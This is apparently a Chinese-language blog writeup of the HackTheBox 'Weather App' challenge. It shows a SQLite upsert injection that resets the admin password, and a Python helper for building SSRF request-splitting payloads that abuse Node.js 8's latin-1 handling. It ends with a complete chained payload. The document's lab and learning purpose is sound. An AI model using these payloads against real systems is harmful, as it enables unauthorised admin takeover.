---
title: ' [HTB] 又一道writeup:Weather | 收获颇多'
date: 2021-12-22 17:47:53
tags: [HTB,web,靶场,刷题]
published: true
hideInList: false
feature: 
isTop: false
---


# Weather App

这道题值得慢慢啃,如果有缘看到我这篇writeup的话,建议你实在啃不下再看(或者只看卡住的地方)

## 题目分析

不管用burp抓包,还是分析源代码.均可以看到,天气的获取以POST方式请求了`/api/weather` 接口(源代码见`/static/js/main.js` )

看源代码进行审计的时候,还发现了在`/static/host-unreachable.jpg` 下的一个图片

<!-- more -->
<script language = JavaScript> function password() {

    var testV = 1;

    var pass1 = prompt('please input the password','');

    var passwordforthisarticle = "dhlove";

    var inputtimemax = 5;

    while (testV < inputtimemax) {

    if (!pass1)

    history.go(-1);

    if (pass1 == passwordforthisarticle) {

    break;

    }

    testV+=1;

    var pass1 =

    prompt('Password error!');

    }

    if (pass1!= passwordforthisarticle & testV == inputtimemax)  

    history.go(-1);

    return " ";

    }

    document.write(password());

</script>
![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled.png)

### 代码审计

进行代码的分析,发现只要从接口``/api/weather` ` 返回的天气温度存在,就会输出对应的相应数据



```jsx
data = await res.json();

    if (data.temp) {
        weather.innerHTML = `
            <div class='${data.icon}'></div>
            <h1>City: ${city}</h1>
            <h1>Temp: ${data.temp} C</h1>
            <h3>Status: ${data.desc}</h3>
        `;
    } else {
        weather.innerHTML = `
            <h3>${data.message}</h3>
        `;
    }
```

才发现,原来这个lab需要在题目页面下载必要的文件.使用docker去build对应的image.然后去分析本地运行的代码,了解这个application是如何运作的.

首先发现是node.js写的,代码量不大

看所提供的文件,routes文件夹下的js文件,大概了解了路由和html文件的对应关系,除了首页外,还有/register和/login.而在/login的节点下,以管理员身份登陆就会返回flag.相关的代码如下

```jsx
router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});
```

而这里的db即database,对应的是database.js .其中idAdmin的方法如下:(这里不可sql注入)

```jsx
async isAdmin(user, pass) {
        return new Promise(async (resolve, reject) => {
            try {
                let smt = await this.db.prepare('SELECT username FROM users WHERE username = ? and password = ?');
                let row = await smt.get(user, pass);
                resolve(row !== undefined ? row.username == 'admin' : false);
            } catch(e) {
                reject(e);
            }
        });
    }
```

其中`this.db` 

```python
async connect() {
        this.db = await sqlite.open(this.db_file);
    }
```

而数据库表结构如下,username是不可重复的,且默认会创建一个admin用户

```jsx
return this.db.exec(`
            DROP TABLE IF EXISTS users;

            CREATE TABLE IF NOT EXISTS users (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                username   VARCHAR(255) NOT NULL UNIQUE,
                password   VARCHAR(255) NOT NULL
            );

            INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
        `);
```

看起来好像暂时没有什么头绪了....然后突然想起不知道需要下载文件前看到的那张meme图.去查看一下使用api相关的代码吧!查看./helpers/WeatherHelper.js文件,对应的就是前端的endpoint:/api/weather

后台请求的链接是这样的

```jsx
let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`);
```

其中HttpGet如下(位于helpers/HttpHelper.js):

```jsx
HttpGet(url) {
		return new Promise((resolve, reject) => {
			http.get(url, res => {
				let body = '';
				res.on('data', chunk => body += chunk);
				res.on('end', () => {
					try {
						resolve(JSON.parse(body));
					} catch(e) {
						resolve(false);
					}
				});
			}).on('error', reject);
		});
	}
```

向该url请求后,会判断`weatherData` (即返回的response的json数据下)有无name字段,如果有,则进行进一步变量赋值. 这里不太会了,按照我的理解,关键在于利用api来伪造admin阅读有flag的endpoint.打算在本地先测试一下....

然后我又返回去阅读了一下isAdmin的代码,发现只要注册成功,就可以用这个用户名登陆.然后被识别为admin.

```jsx
resolve(row !== undefined ? row.username == 'admin' : false);
```

然后我第一次认真的看了register相关的代码(  看过代码,才发现为什么之前测试这个endpoint 的时候,每次点击注册,都会返回401. `req.socket.remoteAddress.replace(/^.*:/, '')` 是过滤,会把冒号前的过滤掉,包括冒号本身.

这里的remoteAddress包括ipv4和ipv6的地址,更多相关可以看stackoverflow上的问答:

[https://stackoverflow.com/questions/31100703/stripping-ffff-prefix-from-request-connection-remoteaddress-nodejs](https://stackoverflow.com/questions/31100703/stripping-ffff-prefix-from-request-connection-remoteaddress-nodejs)

```jsx
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});
```

再看一下注册相关的sql代码,是没有使用占位符(?)来防止sql注入的.看起来要用ssrf实现注册, 并且要利用到sql注入,绕过该if判断.然后进行登陆,拿到flag, 实验一下自己的猜想,把注册处的判断注释掉,然后实验sql注入能否在该endpoint上拿到admin的密码

## 取消401注释,构造SQL注入

看代码知道,只有/register处能够注入,

register处的sql操作的代码

```jsx
async register(user, pass) {
        // TODO: add parameterization and roll public
        return new Promise(async (resolve, reject) => {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch(e) {
                reject(e);
            }
        });
    }
```

(在没有源码的基础上,其实首先是要测试原始sql数据库类型,以及语句的闭合方式/参数个数,这里的闭合方式为`');--` )

这里不能用ADN和OR,因为这两个运算符都用于: 结合一个 SQL 语句的 WHERE 子句中的多个条件。

一开始我对payload的猜想是这样的:

```jsx
username=abc4&password=1234');+UPDATE+users+SET+password='1234'+WHERE+username='admin';--
```

拼接起来,在nodejs的register函数下,query对应的值便是:

`INSERT INTO users (username, password) VALUES ('abc', '1234'); UPDATE users SET password='1234' WHERE username='admin';--')`

但是在下文的”验证:”一节中,却发现该payload无法使用.初步实验后,发现nodejs此处调用的query只执行第一句sql(”;”前的),本以为这样行的通,没想到这里的payload要重新构造,然后对”insert into”语句如何忽略unique约束进行了查询,sqlite官方有描述:[https://sqlite.org/lang_conflict.html](https://sqlite.org/lang_conflict.html)

用法描述见:[https://www.sqlite.org/lang_UPSERT.html](https://www.sqlite.org/lang_UPSERT.html)

根据文档描述,在本地建了一个sqlite数据库进行测试,以下语句最终可以测试通过:

```python
insert into users(username,password) values('admin','admin') on conflict(username) do update set password = '1234' where username='admin'
```

所以payload就是:

```python
username=admin&password=1234')%20on%20conflict(username)%20do%20update%20set%20password%20%3d%20'1234'%20where%20username%3d'admin';--
```

## 漏洞利用

好耶,要用到nodejs的漏洞!其实我卡这里了,看了别人的文章才知道....qwq虽然文中提到先知社区的文章很好,但是我打算先靠自己的力量:搜索找到对应的nodejs v8的相关安全文章(得训练自己这方面的能力)

在上一步的sql注入测试中,为了只针对sql,所以对如下代码加了注释.在这一步中,要通过nodejs的漏洞来绕过该判断

```jsx

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}
```

### 查找漏洞相关内容

看Dockerfile发现node的版本是node:8.12.0-alpine,

nodejs的更新日记:[https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V8.md#8.12.0](https://github.com/nodejs/node/blob/master/doc/changelogs/CHANGELOG_V8.md#8.12.0)

在issues下以sucurity和semver-major的标签也能够找到:[https://github.com/nodejs/node/pull/16237](https://github.com/nodejs/node/pull/16237) 可以看得到利用这个安全问题可以实现请求走私,在issues下还引用了一篇经典的orange的SSRF的报告(如图) 是关于在SSRF中实现走私,ppt在nodejs相关的页数中写到,像U+FF2E即**全宽**拉丁大写字母”Ｎ”的unicode编码,在进行http协议的url处理时,不能完整地处理它的编码,导致ＮＮ/被转义为`../`   

![Untitled_1](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled_1.png)

详细的解释见:[https://github.com/nodejs/node/issues/13296#issuecomment-305162413](https://github.com/nodejs/node/issues/13296#issuecomment-305162413)

### 尝试理解产生原因

这个bug是在http请求中遇到non-Latin-1字符时才会出现的,而针对http类的请求,nodejs对于header处理时是统一按照latin-1编码进行处理,而不是UTF-8.然后我根据我的理解,按照关键词”nodejs latin1 injection”进行google,就搜到了先知社区引用的那篇英文原文的报告www

> Node.js defaults to using "latin1", a single-byte encoding that cannot represent high-numbered unicode characters such as the 🐶 emoji
> 

这样理解的话,这个漏洞就是利用nodejs默认采用latin-1编码在http协议上,导致宽字节的数据在传输中缺损,及安全意义上的”数据不完整”.

根据github的issues以及搜到的文章阅读后理解,latin-1在处理unicode下的宽字节编码时,只保留特定位数,而剩余码位上的数字会被忽略,举例来说,就是:

`\uff2e` 会变成 `0x2e`

用在线unicode编码测试一下:[https://tool.chinaz.com/tools/unicode.aspx](https://tool.chinaz.com/tools/unicode.aspx) 就发现猜想正确了.

而因为nodejs在处理latin-1编码的时候,`\u010D\u010A/` 在latin-1下并非控制字符,所以绕过了nodejs内部的防御.

### 构造对应SSRF

同样的,我会先在线下的docker环境中进行测试

空格的unicode编码为:`\u0020` 转为latin-1:`\u0120`

这里写个python脚本进行转换好了....突然觉得手动有点麻烦

如下:

```python
import re
from pprint import pprint

def decode(my_str):
    """将包含宽字节的字符串以latin-1编码方式进行解码(复现nodejs v8字节丢失)"""
    rules = re.compile(r'\\u[0-9A-Za-z]{2}')
    rules_2 = re.compile('\\u0020')
    after = rules.sub(r'\\u00', my_str).encode('utf-8').decode('unicode_escape')
    after = rules_2.sub(r' ',after)
    print(after) 
    # pprint(after) #如果用pprint,可以输出控制符
    return after

def encode(my_str):
    """将普通编码的字符串转换为能用于构造payload的latin-1编码"""
    rules = re.compile(r'\\n')
    rules_2 = re.compile(r' ')
    my_str = my_str.encode('unicode_escape').decode('utf-8')
    unicode_str = rules.sub(r'\\u010D\\u010A', my_str)
    after = rules_2.sub(r'\\u0120', unicode_str)
    print(after)
```

### 验证:

我直接现场折腾nodejs然后写了一段nodejs在原始代码上....😭(因为sqlite运行在docker内部,而docker运行状态中,使用attach进入后必须得中断当前运行的nodejs代码....直接在docker容器外进行sqlite3连接是不行的,不过....如果有大佬能告诉我别的方法万分感谢,这里我研究了好久)

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled_2.png)

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled_3.png)

验证步骤如下:

- 代码处401处注释下,首先验证sql注入
- 取消注释,在api接口处,结合/register下的请求,验证ssrf(利用漏洞,走私,携带第一步中的sql注入的请求)

在第二步验证的时候要想办法构造合适的内容跳过if的判断,其实就是无论是ipv4还是ipv6下,用户(即客户端)访问的ip均要保证为127.0.0.1

还有这一步Content-Length很重要,如果计算不对直接影响req.socket.remoteAddress为undefined(血泪教训,卡了我一天半TUT) 如果不会用计算Content-Length的话,可以先把它设置为大一点的值,服务器对应会显示”request aborted”,然后在这个临界基础上往下减就可以

![Untitled](https://cdn.jsdelivr.net/gh/1dayluo/PicGo4Blog/data/Untitled_4.png)

### 最后的payload

哭了,做了一周 终于啃出来了

```python
127.0.0.1/test\u0120HTTP/1.1\u010D\u010AHost:127.0.0.1:80\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1:80\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120120\u010D\u010A\u010D\u010Ausername=admin&password=1234')+on+conflict(username)+do+update+set+password='1234'+where+username='admin';--\u010D\u010A\u010D\u010AGET\u0120/123
```

## 参考

- [https://blog.le31ei.top/2021/05/23/nodejs请求走私与ssrf/](https://blog.le31ei.top/2021/05/23/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%8Essrf/)   (感谢老哥文章,不然真的不知道要用到nodejs漏洞)
- [https://github.com/nodejs/node/issues/13296#issuecomment-305162413](https://github.com/nodejs/node/issues/13296#issuecomment-305162413)
- [https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)
- [https://sqlite.org/forum/info/a0693a9e8ad39120](https://sqlite.org/forum/info/a0693a9e8ad39120)